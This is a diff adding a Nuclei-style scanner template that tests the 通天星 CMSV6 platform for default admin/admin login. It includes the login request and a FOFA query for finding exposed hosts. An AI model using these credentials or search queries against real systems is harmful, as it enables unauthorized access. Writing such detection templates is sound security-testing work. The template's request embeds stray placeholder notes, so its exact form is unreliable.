@@ -1,0 +1,34 @@
+id: poc-lp6axo6zfr1ovn8c
+info:
+  name: 通天星CMSV6弱口令漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lp6axo6zfr1ovn8c'
+  tags: default-login,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lp6axo6zfr1ovn8c
+    fofa: body="/808gps/"
+http:
+- raw:
+  - 'GET /StandardApiAction_login.action?account=admin&password=admin HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
